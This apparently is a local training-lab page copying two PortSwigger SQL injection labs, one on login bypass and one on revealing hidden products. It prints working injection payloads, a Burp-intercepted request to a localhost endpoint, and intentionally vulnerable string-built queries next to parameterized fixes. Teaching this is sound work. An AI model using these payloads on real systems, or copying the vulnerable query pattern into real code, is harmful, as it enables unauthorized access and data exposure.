SQL injection vulnerability allowing login bypass
⬤ APPRENTICE Source: PortSwigger Web Security Academy ↗

Lab Description

This lab contains a SQL injection vulnerability in the login function. To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.

Background

The login query is built by concatenating user input directly into a SQL string:

SELECT * FROM users
WHERE username='[input]'
AND password='[input]'

Injecting into the username field can break the query structure entirely.

Task

○ Log in as administrator without knowing the password
○ Confirm injection bypasses the password check entirely

Payloads to try

How the bypass works

Payload: administrator'--

SELECT * FROM users WHERE
username='administrator'--' AND password='x'
         └─ closes string   └─ commented out!
Burp tip: Intercept the POST to /api/login-vulnerable and edit the username field directly in Burp before forwarding.

Why It's Vulnerable vs. Safe

💀 Vulnerable — string interpolation
// Input injected directly into SQL
const sql = `SELECT * FROM users
  WHERE username='${username}'
  AND password='${password}'`;
// Attacker can escape the string!
✅ Safe — parameterized query
// ? = placeholder, input is data only
const sql = `SELECT * FROM users
  WHERE username=?
  AND password=?`;

db.prepare(sql).all(username, password);
// Input CANNOT change query structure

🛡️ Intercept with Burp Suite

Point Burp's proxy at localhost:3000. Submit the form with Intercept on to catch this raw POST:

POST /api/login-vulnerable HTTP/1.1 Host: localhost:3000 Content-Type: application/json {"username":"administrator'--","password":"anything"}

Modify the username to administrator'-- and forward. The -- comments out the password check entirely.

SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
⬤ APPRENTICE Source: PortSwigger Web Security Academy ↗

Lab Description

This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query:

SELECT * FROM products
WHERE category='[input]'
AND released=1

The released=1 condition hides unreleased items. Injection can remove this restriction.

Task

○ Make the application display unreleased products
○ Retrieve all products across all categories

Payloads to try

How it works

Payload: Gifts' OR 1=1--

SELECT * FROM products WHERE
category='Gifts' OR 1=1--' AND released=1
  └─ always true! └─ commented out!

Safe vs Vulnerable

Currently using: vulnerable endpoint (string interpolation)
🎉 Congratulations, you solved the lab! Hidden products revealed via SQL injection.

Why It's Vulnerable vs. Safe

💀 Vulnerable — WHERE clause

const sql = `SELECT * FROM products
  WHERE category='${category}'
  AND released=1`;
// Injection removes released=1 check
✅ Safe — parameterized
// Input treated as pure data
const sql = `SELECT * FROM products
  WHERE category=?
  AND released=1`;

db.prepare(sql).all(category);
// released=1 ALWAYS enforced
